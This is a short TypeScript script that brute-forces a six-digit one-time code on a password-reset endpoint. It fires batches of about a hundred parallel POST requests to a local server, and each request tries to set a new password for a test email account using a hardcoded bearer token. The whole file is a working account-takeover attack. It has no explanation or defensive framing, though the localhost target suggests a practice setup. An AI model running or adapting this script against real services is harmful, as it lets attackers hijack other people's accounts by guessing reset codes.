import axios from 'axios';


async function sendRequest(otp: String) {   
    let data = JSON.stringify({
    "email": "test@mail.com",
    "otp": otp,
    "newPassword": "1231231"
    });

    let config = {
    method: 'post',
    maxBodyLength: Infinity,
    url: 'http://localhost:3000/reset-password',
    headers: { 
        'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY4OWNlMGU5YTAxOTI2ZGVmYmRjMDc2MiIsInJvbGUiOiJzdHVkZW50IiwiaWF0IjoxNzU1NTgyMTg4fQ.kF0EwYbGqhVdmeYFF9Fn4IkXdX-ZHVtvp9qib4x95mw', 
        'Content-Type': 'application/json'
    },
    data : data
    };

    try{
        await axios.request(config)
    } catch(e) {
        // console.log(e);
    }
}




async function main() {
    for (let i=0; i<=999999; i+=100) {
        const p = [];
        console.log(i);
       
        for(let j=0; j<=100; j++) {
            p.push(sendRequest((i+j).toString()));
        }
        await Promise.all(p);
    }
}
main();